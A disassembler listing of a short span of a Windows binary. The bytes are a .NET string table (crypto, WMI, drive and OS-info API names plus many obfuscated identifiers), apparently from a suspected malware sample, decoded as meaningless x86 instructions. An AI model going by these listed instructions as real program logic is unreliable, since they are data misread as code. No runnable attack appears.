  409023:	49                   	dec    %ecx
  409024:	74 65                	je     0x40908b
  409026:	6d                   	insl   (%dx),%es:(%edi)
  409027:	00 67 65             	add    %ah,0x65(%edi)
  40902a:	74 5f                	je     0x40908b
  40902c:	49                   	dec    %ecx
  40902d:	73 36                	jae    0x409065
  40902f:	34 42                	xor    $0x42,%al
  409031:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  409038:	74 
  409039:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  409040:	65 6d                	gs insl (%dx),%es:(%edi)
  409042:	00 69 4e             	add    %ch,0x4e(%ecx)
  409045:	6d                   	insl   (%dx),%es:(%edi)
  409046:	44                   	inc    %esp
  409047:	70 77                	jo     0x4090c0
  409049:	52                   	push   %edx
  40904a:	49                   	dec    %ecx
  40904b:	71 66                	jno    0x4090b3
  40904d:	67 6d                	insl   (%dx),%es:(%di)
  40904f:	00 43 7a             	add    %al,0x7a(%ebx)
  409052:	71 4d                	jno    0x4090a1
  409054:	43                   	inc    %ebx
  409055:	59                   	pop    %ecx
  409056:	4b                   	dec    %ebx
  409057:	45                   	inc    %ebp
  409058:	48                   	dec    %eax
  409059:	68 6d 00 53 79       	push   $0x7953006d
  40905e:	6d                   	insl   (%dx),%es:(%edi)
  40905f:	6d                   	insl   (%dx),%es:(%edi)
  409060:	65 74 72             	gs je  0x4090d5
  409063:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  40906a:	69 74 68 6d 00 41 73 	imul   $0x79734100,0x6d(%eax,%ebp,2),%esi
  409071:	79 
  409072:	6d                   	insl   (%dx),%es:(%edi)
  409073:	6d                   	insl   (%dx),%es:(%edi)
  409074:	65 74 72             	gs je  0x4090e9
  409077:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  40907e:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  409085:	73 
  409086:	68 41 6c 67 6f       	push   $0x6f676c41
  40908b:	72 69                	jb     0x4090f6
  40908d:	74 68                	je     0x4090f7
  40908f:	6d                   	insl   (%dx),%es:(%edi)
  409090:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  409094:	6d                   	insl   (%dx),%es:(%edi)
  409095:	00 6e 5a             	add    %ch,0x5a(%esi)
  409098:	51                   	push   %ecx
  409099:	74 72                	je     0x40910d
  40909b:	6d                   	insl   (%dx),%es:(%edi)
  40909c:	62 41 79             	bound  %eax,0x79(%ecx)
  40909f:	5a                   	pop    %edx
  4090a0:	6d                   	insl   (%dx),%es:(%edi)
  4090a1:	6d                   	insl   (%dx),%es:(%edi)
  4090a2:	00 52 61             	add    %dl,0x61(%edx)
  4090a5:	6e                   	outsb  %ds:(%esi),(%dx)
  4090a6:	64 6f                	outsl  %fs:(%esi),(%dx)
  4090a8:	6d                   	insl   (%dx),%es:(%edi)
  4090a9:	00 59 71             	add    %bl,0x71(%ecx)
  4090ac:	49                   	dec    %ecx
  4090ad:	6a 41                	push   $0x41
  4090af:	53                   	push   %ebx
  4090b0:	59                   	pop    %ecx
  4090b1:	64 70 6d             	fs jo  0x409121
  4090b4:	00 49 43             	add    %cl,0x43(%ecx)
  4090b7:	72 79                	jb     0x409132
  4090b9:	70 74                	jo     0x40912f
  4090bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4090bc:	54                   	push   %esp
  4090bd:	72 61                	jb     0x409120
  4090bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4090c0:	73 66                	jae    0x409128
  4090c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4090c3:	72 6d                	jb     0x409132
  4090c5:	00 45 6e             	add    %al,0x6e(%ebp)
  4090c8:	75 6d                	jne    0x409137
  4090ca:	00 46 51             	add    %al,0x51(%esi)
  4090cd:	6c                   	insb   (%dx),%es:(%edi)
  4090ce:	44                   	inc    %esp
  4090cf:	59                   	pop    %ecx
  4090d0:	52                   	push   %edx
  4090d1:	50                   	push   %eax
  4090d2:	51                   	push   %ecx
  4090d3:	53                   	push   %ebx
  4090d4:	46                   	inc    %esi
  4090d5:	78 4c                	js     0x409123
  4090d7:	77 6d                	ja     0x409146
  4090d9:	00 61 46             	add    %ah,0x46(%ecx)
  4090dc:	73 52                	jae    0x409130
  4090de:	50                   	push   %eax
  4090df:	41                   	inc    %ecx
  4090e0:	54                   	push   %esp
  4090e1:	62 4e 45             	bound  %ecx,0x45(%esi)
  4090e4:	47                   	inc    %edi
  4090e5:	42                   	inc    %edx
  4090e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4090e7:	00 49 68             	add    %cl,0x68(%ecx)
  4090ea:	64 4e                	fs dec %esi
  4090ec:	63 6a 6f             	arpl   %ebp,0x6f(%edx)
  4090ef:	72 78                	jb     0x409169
  4090f1:	4f                   	dec    %edi
  4090f2:	6e                   	outsb  %ds:(%esi),(%dx)
  4090f3:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  4090f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4090f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4090f9:	6c                   	insb   (%dx),%es:(%edi)
  4090fa:	65 61                	gs popa
  4090fc:	6e                   	outsb  %ds:(%esi),(%dx)
  4090fd:	00 6b 65             	add    %ch,0x65(%ebx)
  409100:	62 77 49             	bound  %esi,0x49(%edi)
  409103:	53                   	push   %ebx
  409104:	4b                   	dec    %ebx
  409105:	50                   	push   %eax
  409106:	78 64                	js     0x40916c
  409108:	6e                   	outsb  %ds:(%esi),(%dx)
  409109:	00 54 4b 78          	add    %dl,0x78(%ebx,%ecx,2)
  40910d:	76 4c                	jbe    0x40915b
  40910f:	69 44 52 55 66 6e 00 	imul   $0x4e006e66,0x55(%edx,%edx,2),%eax
  409116:	4e 
  409117:	6e                   	outsb  %ds:(%esi),(%dx)
  409118:	61                   	popa
  409119:	4f                   	dec    %edi
  40911a:	54                   	push   %esp
  40911b:	66 59                	pop    %cx
  40911d:	5a                   	pop    %edx
  40911e:	59                   	pop    %ecx
  40911f:	77 77                	ja     0x409198
  409121:	66 6e                	data16 outsb %ds:(%esi),(%dx)
  409123:	00 4d 61             	add    %cl,0x61(%ebp)
  409126:	69 6e 00 58 35 30 39 	imul   $0x39303558,0x0(%esi),%ebp
  40912d:	43                   	inc    %ebx
  40912e:	68 61 69 6e 00       	push   $0x6e6961
  409133:	41                   	inc    %ecx
  409134:	70 70                	jo     0x4091a6
  409136:	44                   	inc    %esp
  409137:	6f                   	outsl  %ds:(%esi),(%dx)
  409138:	6d                   	insl   (%dx),%es:(%edi)
  409139:	61                   	popa
  40913a:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  409141:	43                   	inc    %ebx
  409142:	75 72                	jne    0x4091b6
  409144:	72 65                	jb     0x4091ab
  409146:	6e                   	outsb  %ds:(%esi),(%dx)
  409147:	74 44                	je     0x40918d
  409149:	6f                   	outsl  %ds:(%esi),(%dx)
  40914a:	6d                   	insl   (%dx),%es:(%edi)
  40914b:	61                   	popa
  40914c:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  409153:	00 59 4c             	add    %bl,0x4c(%ecx)
  409156:	78 58                	js     0x4091b0
  409158:	65 4d                	gs dec %ebp
  40915a:	49                   	dec    %ecx
  40915b:	57                   	push   %edi
  40915c:	74 57                	je     0x4091b5
  40915e:	4f                   	dec    %edi
  40915f:	6e                   	outsb  %ds:(%esi),(%dx)
  409160:	6e                   	outsb  %ds:(%esi),(%dx)
  409161:	00 47 65             	add    %al,0x65(%edi)
  409164:	74 46                	je     0x4091ac
  409166:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  40916d:	57 
  40916e:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  409175:	78 
  409176:	74 65                	je     0x4091dd
  409178:	6e                   	outsb  %ds:(%esi),(%dx)
  409179:	73 69                	jae    0x4091e4
  40917b:	6f                   	outsl  %ds:(%esi),(%dx)
  40917c:	6e                   	outsb  %ds:(%esi),(%dx)
  40917d:	00 67 65             	add    %ah,0x65(%edi)
  409180:	74 5f                	je     0x4091e1
  409182:	4f                   	dec    %edi
  409183:	53                   	push   %ebx
  409184:	56                   	push   %esi
  409185:	65 72 73             	gs jb  0x4091fb
  409188:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  40918f:	74 65                	je     0x4091f6
  409191:	6d                   	insl   (%dx),%es:(%edi)
  409192:	2e 49                	cs dec %ecx
  409194:	4f                   	dec    %edi
  409195:	2e 43                	cs inc %ebx
  409197:	6f                   	outsl  %ds:(%esi),(%dx)
  409198:	6d                   	insl   (%dx),%es:(%edi)
  409199:	70 72                	jo     0x40920d
  40919b:	65 73 73             	gs jae 0x409211
  40919e:	69 6f 6e 00 41 70 70 	imul   $0x70704100,0x6e(%edi),%ebp
  4091a5:	6c                   	insb   (%dx),%es:(%edi)
  4091a6:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  4091ad:	00 53 79             	add    %dl,0x79(%ebx)
  4091b0:	73 74                	jae    0x409226
  4091b2:	65 6d                	gs insl (%dx),%es:(%edi)
  4091b4:	2e 53                	cs push %ebx
  4091b6:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4091ba:	69 74 79 2e 41 75 74 	imul   $0x68747541,0x2e(%ecx,%edi,2),%esi
  4091c1:	68 
  4091c2:	65 6e                	outsb  %gs:(%esi),(%dx)
  4091c4:	74 69                	je     0x40922f
  4091c6:	63 61 74             	arpl   %esp,0x74(%ecx)
  4091c9:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  4091d0:	74 65                	je     0x409237
  4091d2:	6d                   	insl   (%dx),%es:(%edi)
  4091d3:	2e 52                	cs push %edx
  4091d5:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  4091d8:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4091dd:	6e                   	outsb  %ds:(%esi),(%dx)
  4091de:	00 58 35             	add    %bl,0x35(%eax)
  4091e1:	30 39                	xor    %bh,(%ecx)
  4091e3:	43                   	inc    %ebx
  4091e4:	65 72 74             	gs jb  0x40925b
  4091e7:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4091ee:	43                   	inc    %ebx
  4091ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4091f0:	6c                   	insb   (%dx),%es:(%edi)
  4091f1:	6c                   	insb   (%dx),%es:(%edi)
  4091f2:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4091f7:	6e                   	outsb  %ds:(%esi),(%dx)
  4091f8:	00 4d 61             	add    %cl,0x61(%ebp)
  4091fb:	6e                   	outsb  %ds:(%esi),(%dx)
  4091fc:	61                   	popa
  4091fd:	67 65 6d             	gs insl (%dx),%es:(%di)
  409200:	65 6e                	outsb  %gs:(%esi),(%dx)
  409202:	74 4f                	je     0x409253
  409204:	62 6a 65             	bound  %ebp,0x65(%edx)
  409207:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  40920b:	6c                   	insb   (%dx),%es:(%edi)
  40920c:	6c                   	insb   (%dx),%es:(%edi)
  40920d:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409212:	6e                   	outsb  %ds:(%esi),(%dx)
  409213:	00 73 65             	add    %dh,0x65(%ebx)
  409216:	74 5f                	je     0x409277
  409218:	50                   	push   %eax
  409219:	6f                   	outsl  %ds:(%esi),(%dx)
  40921a:	73 69                	jae    0x409285
  40921c:	74 69                	je     0x409287
  40921e:	6f                   	outsl  %ds:(%esi),(%dx)
  40921f:	6e                   	outsb  %ds:(%esi),(%dx)
  409220:	00 43 72             	add    %al,0x72(%ebx)
  409223:	79 70                	jns    0x409295
  409225:	74 6f                	je     0x409296
  409227:	67 72 61             	addr16 jb 0x40928b
  40922a:	70 68                	jo     0x409294
  40922c:	69 63 45 78 63 65 70 	imul   $0x70656378,0x45(%ebx),%esp
  409233:	74 69                	je     0x40929e
  409235:	6f                   	outsl  %ds:(%esi),(%dx)
  409236:	6e                   	outsb  %ds:(%esi),(%dx)
  409237:	00 41 72             	add    %al,0x72(%ecx)
  40923a:	67 75 6d             	addr16 jne 0x4092aa
  40923d:	65 6e                	outsb  %gs:(%esi),(%dx)
  40923f:	74 4e                	je     0x40928f
  409241:	75 6c                	jne    0x4092af
  409243:	6c                   	insb   (%dx),%es:(%edi)
  409244:	45                   	inc    %ebp
  409245:	78 63                	js     0x4092aa
  409247:	65 70 74             	gs jo  0x4092be
  40924a:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  409251:	75 6d                	jne    0x4092c0
  409253:	65 6e                	outsb  %gs:(%esi),(%dx)
  409255:	74 45                	je     0x40929c
  409257:	78 63                	js     0x4092bc
  409259:	65 70 74             	gs jo  0x4092d0
  40925c:	69 6f 6e 00 43 69 7a 	imul   $0x7a694300,0x6e(%edi),%ebp
  409263:	6f                   	outsl  %ds:(%esi),(%dx)
  409264:	4d                   	dec    %ebp
  409265:	74 64                	je     0x4092cb
  409267:	65 41                	gs inc %ecx
  409269:	6f                   	outsl  %ds:(%esi),(%dx)
  40926a:	00 41 69             	add    %al,0x69(%ecx)
  40926d:	4b                   	dec    %ebx
  40926e:	5a                   	pop    %edx
  40926f:	59                   	pop    %ecx
  409270:	4a                   	dec    %edx
  409271:	70 62                	jo     0x4092d5
  409273:	7a 69                	jp     0x4092de
  409275:	42                   	inc    %edx
  409276:	6f                   	outsl  %ds:(%esi),(%dx)
  409277:	00 51 64             	add    %dl,0x64(%ecx)
  40927a:	63 59 43             	arpl   %ebx,0x43(%ecx)
  40927d:	6b 49 41 6f          	imul   $0x6f,0x41(%ecx),%ecx
  409281:	44                   	inc    %esp
  409282:	6f                   	outsl  %ds:(%esi),(%dx)
  409283:	00 5a 65             	add    %bl,0x65(%edx)
  409286:	61                   	popa
  409287:	48                   	dec    %eax
  409288:	59                   	pop    %ecx
  409289:	61                   	popa
  40928a:	72 67                	jb     0x4092f3
  40928c:	6d                   	insl   (%dx),%es:(%edi)
  40928d:	64 4e                	fs dec %esi
  40928f:	4b                   	dec    %ebx
  409290:	6f                   	outsl  %ds:(%esi),(%dx)
  409291:	00 54 48 66          	add    %dl,0x66(%eax,%ecx,2)
  409295:	4e                   	dec    %esi
  409296:	77 5a                	ja     0x4092f2
  409298:	6d                   	insl   (%dx),%es:(%edi)
  409299:	54                   	push   %esp
  40929a:	6d                   	insl   (%dx),%es:(%edi)
  40929b:	45                   	inc    %ebp
  40929c:	4d                   	dec    %ebp
  40929d:	6a 4c                	push   $0x4c
  40929f:	6f                   	outsl  %ds:(%esi),(%dx)
  4092a0:	00 49 6e             	add    %cl,0x6e(%ecx)
  4092a3:	41                   	inc    %ecx
  4092a4:	45                   	inc    %ebp
  4092a5:	53                   	push   %ebx
  4092a6:	4d                   	dec    %ebp
  4092a7:	4a                   	dec    %edx
  4092a8:	6e                   	outsb  %ds:(%esi),(%dx)
  4092a9:	51                   	push   %ecx
  4092aa:	59                   	pop    %ecx
  4092ab:	52                   	push   %edx
  4092ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4092ad:	00 4b 61             	add    %cl,0x61(%ebx)
  4092b0:	67 59                	addr16 pop %ecx
  4092b2:	63 6d 65             	arpl   %ebp,0x65(%ebp)
  4092b5:	42                   	inc    %edx
  4092b6:	43                   	inc    %ebx
  4092b7:	77 71                	ja     0x40932a
  4092b9:	63 61 6f             	arpl   %esp,0x6f(%ecx)
  4092bc:	00 49 6d             	add    %cl,0x6d(%ecx)
  4092bf:	61                   	popa
  4092c0:	67 65 43             	addr16 gs inc %ebx
  4092c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4092c4:	64 65 63 49 6e       	fs arpl %ecx,%gs:0x6e(%ecx)
  4092c9:	66 6f                	outsw  %ds:(%esi),(%dx)
  4092cb:	00 46 69             	add    %al,0x69(%esi)
  4092ce:	6c                   	insb   (%dx),%es:(%edi)
  4092cf:	65 49                	gs dec %ecx
  4092d1:	6e                   	outsb  %ds:(%esi),(%dx)
  4092d2:	66 6f                	outsw  %ds:(%esi),(%dx)
  4092d4:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  4092d8:	76 65                	jbe    0x40933f
  4092da:	49                   	dec    %ecx
  4092db:	6e                   	outsb  %ds:(%esi),(%dx)
  4092dc:	66 6f                	outsw  %ds:(%esi),(%dx)
  4092de:	00 46 69             	add    %al,0x69(%esi)
  4092e1:	6c                   	insb   (%dx),%es:(%edi)
  4092e2:	65 53                	gs push %ebx
  4092e4:	79 73                	jns    0x409359
  4092e6:	74 65                	je     0x40934d
  4092e8:	6d                   	insl   (%dx),%es:(%edi)
  4092e9:	49                   	dec    %ecx
  4092ea:	6e                   	outsb  %ds:(%esi),(%dx)
  4092eb:	66 6f                	outsw  %ds:(%esi),(%dx)
  4092ed:	00 43 6f             	add    %al,0x6f(%ebx)
  4092f0:	6d                   	insl   (%dx),%es:(%edi)
  4092f1:	70 75                	jo     0x409368
  4092f3:	74 65                	je     0x40935a
  4092f5:	72 49                	jb     0x409340
  4092f7:	6e                   	outsb  %ds:(%esi),(%dx)
  4092f8:	66 6f                	outsw  %ds:(%esi),(%dx)
  4092fa:	00 43 53             	add    %al,0x53(%ebx)
  4092fd:	68 61 72 70 41       	push   $0x41707261
  409302:	72 67                	jb     0x40936b
  409304:	75 6d                	jne    0x409373
  409306:	65 6e                	outsb  %gs:(%esi),(%dx)
  409308:	74 49                	je     0x409353
  40930a:	6e                   	outsb  %ds:(%esi),(%dx)
  40930b:	66 6f                	outsw  %ds:(%esi),(%dx)
  40930d:	00 50 72             	add    %dl,0x72(%eax)
  409310:	6f                   	outsl  %ds:(%esi),(%dx)
  409311:	63 65 73             	arpl   %esp,0x73(%ebp)
  409314:	73 53                	jae    0x409369
  409316:	74 61                	je     0x409379
  409318:	72 74                	jb     0x40938e
  40931a:	49                   	dec    %ecx
  40931b:	6e                   	outsb  %ds:(%esi),(%dx)
  40931c:	66 6f                	outsw  %ds:(%esi),(%dx)
  40931e:	00 4e 61             	add    %cl,0x61(%esi)
  409321:	45                   	inc    %ebp
  409322:	69 58 58 71 7a 75 69 	imul   $0x69757a71,0x58(%eax),%ebx
  409329:	6f                   	outsl  %ds:(%esi),(%dx)
  40932a:	00 62 4c             	add    %ah,0x4c(%edx)
  40932d:	4a                   	dec    %edx
  40932e:	6f                   	outsl  %ds:(%esi),(%dx)
  40932f:	78 79                	js     0x4093aa
  409331:	51                   	push   %ecx
  409332:	57                   	push   %edi
  409333:	53                   	push   %ebx
  409334:	6c                   	insb   (%dx),%es:(%edi)
  409335:	53                   	push   %ebx
  409336:	6e                   	outsb  %ds:(%esi),(%dx)
  409337:	6f                   	outsl  %ds:(%esi),(%dx)
  409338:	00 41 70             	add    %al,0x70(%ecx)
  40933b:	46                   	inc    %esi
  40933c:	51                   	push   %ecx
  40933d:	6a 7a                	push   $0x7a
  40933f:	5a                   	pop    %edx
  409340:	54                   	push   %esp
  409341:	71 49                	jno    0x40938c
  409343:	51                   	push   %ecx
  409344:	51                   	push   %ecx
  409345:	6b 73 6f 00          	imul   $0x0,0x6f(%ebx),%esi
  409349:	71 79                	jno    0x4093c4
  40934b:	7a 67                	jp     0x4093b4
  40934d:	69 76 6e 55 4d 77 6f 	imul   $0x6f774d55,0x6e(%esi),%esi
  409354:	00 47 68             	add    %al,0x68(%edi)
  409357:	4f                   	dec    %edi
  409358:	6b 4b 45 75          	imul   $0x75,0x45(%ebx),%ecx
  40935c:	46                   	inc    %esi
  40935d:	68 6f 4d 6c 68       	push   $0x686c4d6f
  409362:	78 6f                	js     0x4093d3
  409364:	00 44 74 4f          	add    %al,0x4f(%esp,%esi,2)
  409368:	42                   	inc    %edx
  409369:	75 46                	jne    0x4093b1
  40936b:	67 71 76             	addr16 jno 0x4093e4
  40936e:	6f                   	outsl  %ds:(%esi),(%dx)
  40936f:	78 6f                	js     0x4093e0
  409371:	00 4d 74             	add    %cl,0x74(%ebp)
  409374:	48                   	dec    %eax
  409375:	6f                   	outsl  %ds:(%esi),(%dx)
  409376:	50                   	push   %eax
  409377:	41                   	inc    %ecx
  409378:	41                   	inc    %ecx
  409379:	66 47                	inc    %di
  40937b:	4d                   	dec    %ebp
  40937c:	4d                   	dec    %ebp
  40937d:	78 72                	js     0x4093f1
  40937f:	49                   	dec    %ecx
  409380:	70 00                	jo     0x409382
  409382:	49                   	dec    %ecx
  409383:	51                   	push   %ecx
  409384:	74 61                	je     0x4093e7
  409386:	77 51                	ja     0x4093d9
  409388:	69 55 64 70 00 53 6c 	imul   $0x6c530070,0x64(%ebp),%edx
  40938f:	65 65 70 00          	gs gs jo 0x409393
  409393:	4d                   	dec    %ebp
  409394:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  40939b:	74 2e                	je     0x4093cb
  40939d:	43                   	inc    %ebx
  40939e:	53                   	push   %ebx
  40939f:	68 61 72 70 00       	push   $0x707261
  4093a4:	69 52 64 69 46 56 74 	imul   $0x74564669,0x64(%edx),%edx
  4093ab:	72 62                	jb     0x40940f
  4093ad:	53                   	push   %ebx
  4093ae:	5a                   	pop    %edx
  4093af:	6e                   	outsb  %ds:(%esi),(%dx)
  4093b0:	75 70                	jne    0x409422
  4093b2:	00 65 58             	add    %ah,0x58(%ebp)
  4093b5:	55                   	push   %ebp
  4093b6:	50                   	push   %eax
  4093b7:	75 47                	jne    0x409400
  4093b9:	6a 44                	push   $0x44
  4093bb:	45                   	inc    %ebp
  4093bc:	54                   	push   %esp
  4093bd:	71 64                	jno    0x409423
  4093bf:	73 44                	jae    0x409405
  4093c1:	71 00                	jno    0x4093c3
  4093c3:	41                   	inc    %ecx
  4093c4:	66 6b 4a 4d 65       	imul   $0x65,0x4d(%edx),%cx
  4093c9:	78 74                	js     0x40943f
  4093cb:	77 45                	ja     0x409412
  4093cd:	71 00                	jno    0x4093cf
  4093cf:	4f                   	dec    %edi
  4093d0:	50                   	push   %eax
  4093d1:	5a                   	pop    %edx
  4093d2:	6e                   	outsb  %ds:(%esi),(%dx)
  4093d3:	4c                   	dec    %esp
  4093d4:	4b                   	dec    %ebx
  4093d5:	66 4e                	dec    %si
  4093d7:	7a 64                	jp     0x40943d
  4093d9:	56                   	push   %esi
  4093da:	51                   	push   %ecx
  4093db:	71 00                	jno    0x4093dd
  4093dd:	5a                   	pop    %edx
  4093de:	70 65                	jo     0x409445
  4093e0:	55                   	push   %ebp
  4093e1:	56                   	push   %esi
  4093e2:	69 55 52 6f 4d 6b 6e 	imul   $0x6e6b4d6f,0x52(%ebp),%edx
  4093e9:	56                   	push   %esi
  4093ea:	71 00                	jno    0x4093ec
  4093ec:	70 48                	jo     0x409436
  4093ee:	73 65                	jae    0x409455
  4093f0:	75 7a                	jne    0x40946c
  4093f2:	54                   	push   %esp
  4093f3:	61                   	popa
  4093f4:	59                   	pop    %ecx
  4093f5:	71 00                	jno    0x4093f7
  4093f7:	53                   	push   %ebx
  4093f8:	50                   	push   %eax
  4093f9:	64 6e                	outsb  %fs:(%esi),(%dx)
  4093fb:	72 43                	jb     0x409440
  4093fd:	64 49                	fs dec %ecx
  4093ff:	61                   	popa
  409400:	71 00                	jno    0x409402
  409402:	4c                   	dec    %esp
  409403:	41                   	inc    %ecx
  409404:	6c                   	insb   (%dx),%es:(%edi)
  409405:	57                   	push   %edi
  409406:	43                   	inc    %ebx
  409407:	54                   	push   %esp
  409408:	78 72                	js     0x40947c
  40940a:	59                   	pop    %ecx
  40940b:	47                   	inc    %edi
  40940c:	70 57                	jo     0x409465
  40940e:	68 71 00 53 79       	push   $0x79530071
  409413:	73 74                	jae    0x409489
  409415:	65 6d                	gs insl (%dx),%es:(%edi)
  409417:	2e 4c                	cs dec %esp
  409419:	69 6e 71 00 58 79 45 	imul   $0x45795800,0x71(%esi),%ebp
  409420:	61                   	popa
  409421:	52                   	push   %edx
  409422:	7a 4b                	jp     0x40946f
  409424:	50                   	push   %eax
  409425:	54                   	push   %esp
  409426:	6a 61                	push   $0x61
  409428:	43                   	inc    %ebx
  409429:	72 00                	jb     0x40942b
  40942b:	4e                   	dec    %esi
  40942c:	61                   	popa
  40942d:	41                   	inc    %ecx
  40942e:	48                   	dec    %eax
  40942f:	51                   	push   %ecx
  409430:	4e                   	dec    %esi
  409431:	4e                   	dec    %esi
  409432:	75 48                	jne    0x40947c
  409434:	55                   	push   %ebp
  409435:	42                   	inc    %edx
  409436:	57                   	push   %edi
  409437:	72 00                	jb     0x409439
  409439:	46                   	inc    %esi
  40943a:	76 49                	jbe    0x409485
  40943c:	53                   	push   %ebx
  40943d:	4a                   	dec    %edx
  40943e:	69 59 51 4a 65 4f 5a 	imul   $0x5a4f654a,0x51(%ecx),%ebx
  409445:	72 00                	jb     0x409447
  409447:	43                   	inc    %ebx
  409448:	6c                   	insb   (%dx),%es:(%edi)
  409449:	65 61                	gs popa
  40944b:	72 00                	jb     0x40944d
  40944d:	43                   	inc    %ebx
  40944e:	68 61 72 00 49       	push   $0x49007261
  409453:	6e                   	outsb  %ds:(%esi),(%dx)
  409454:	76 6f                	jbe    0x4094c5
  409456:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  40945a:	6d                   	insl   (%dx),%es:(%edi)
  40945b:	62 65 72             	bound  %esp,0x72(%ebp)
  40945e:	00 4d 44             	add    %cl,0x44(%ebp)
  409461:	35 43 72 79 70       	xor    $0x70797243,%eax
  409466:	74 6f                	je     0x4094d7
  409468:	53                   	push   %ebx
  409469:	65 72 76             	gs jb  0x4094e2
  40946c:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  409473:	69 64 65 72 00 52 53 	imul   $0x41535200,0x72(%ebp,%eiz,2),%esp
  40947a:	41 
  40947b:	43                   	inc    %ebx
  40947c:	72 79                	jb     0x4094f7
  40947e:	70 74                	jo     0x4094f4
  409480:	6f                   	outsl  %ds:(%esi),(%dx)
  409481:	53                   	push   %ebx
  409482:	65 72 76             	gs jb  0x4094fb
  409485:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  40948c:	69 64 65 72 00 41 65 	imul   $0x73654100,0x72(%ebp,%eiz,2),%esp
  409493:	73 
  409494:	43                   	inc    %ebx
  409495:	72 79                	jb     0x409510
  409497:	70 74                	jo     0x40950d
  409499:	6f                   	outsl  %ds:(%esi),(%dx)
  40949a:	53                   	push   %ebx
  40949b:	65 72 76             	gs jb  0x409514
  40949e:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  4094a5:	69 64 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esp
  4094ac:	72 
  4094ad:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  4094b4:	64 65 72 00          	fs gs jb 0x4094b8
  4094b8:	4d                   	dec    %ebp
  4094b9:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4094c0:	74 2e                	je     0x4094f0
  4094c2:	43                   	inc    %ebx
  4094c3:	53                   	push   %ebx
  4094c4:	68 61 72 70 2e       	push   $0x2e707261
  4094c9:	52                   	push   %edx
  4094ca:	75 6e                	jne    0x40953a
  4094cc:	74 69                	je     0x409537
  4094ce:	6d                   	insl   (%dx),%es:(%edi)
  4094cf:	65 42                	gs inc %edx
  4094d1:	69 6e 64 65 72 00 43 	imul   $0x43007265,0x64(%esi),%ebp
  4094d8:	61                   	popa
  4094d9:	6c                   	insb   (%dx),%es:(%edi)
  4094da:	6c                   	insb   (%dx),%es:(%edi)
  4094db:	53                   	push   %ebx
  4094dc:	69 74 65 42 69 6e 64 	imul   $0x65646e69,0x42(%ebp,%eiz,2),%esi
  4094e3:	65 
  4094e4:	72 00                	jb     0x4094e6
  4094e6:	67 65 74 5f          	addr16 gs je 0x409549
  4094ea:	42                   	inc    %edx
  4094eb:	75 66                	jne    0x409553
  4094ed:	66 65 72 00          	data16 gs jb 0x4094f1
  4094f1:	73 65                	jae    0x409558
  4094f3:	74 5f                	je     0x409554
  4094f5:	42                   	inc    %edx
  4094f6:	75 66                	jne    0x40955e
  4094f8:	66 65 72 00          	data16 gs jb 0x4094fc
  4094fc:	67 65 74 5f          	addr16 gs je 0x40955f
  409500:	41                   	inc    %ecx
  409501:	73 49                	jae    0x40954c
  409503:	6e                   	outsb  %ds:(%esi),(%dx)
  409504:	74 65                	je     0x40956b
  409506:	67 65 72 00          	addr16 gs jb 0x40950a
  40950a:	73 65                	jae    0x409571
  40950c:	74 5f                	je     0x40956d
  40950e:	41                   	inc    %ecx
  40950f:	73 49                	jae    0x40955a
  409511:	6e                   	outsb  %ds:(%esi),(%dx)
  409512:	74 65                	je     0x409579
  409514:	67 65 72 00          	addr16 gs jb 0x409518
  409518:	4d                   	dec    %ebp
  409519:	61                   	popa
  40951a:	6e                   	outsb  %ds:(%esi),(%dx)
  40951b:	61                   	popa
  40951c:	67 65 6d             	gs insl (%dx),%es:(%di)
  40951f:	65 6e                	outsb  %gs:(%esi),(%dx)
  409521:	74 4f                	je     0x409572
  409523:	62 6a 65             	bound  %ebp,0x65(%edx)
  409526:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  40952a:	61                   	popa
  40952b:	72 63                	jb     0x409590
  40952d:	68 65 72 00 53       	push   $0x53007265
  409532:	65 73 73             	gs jae 0x4095a8
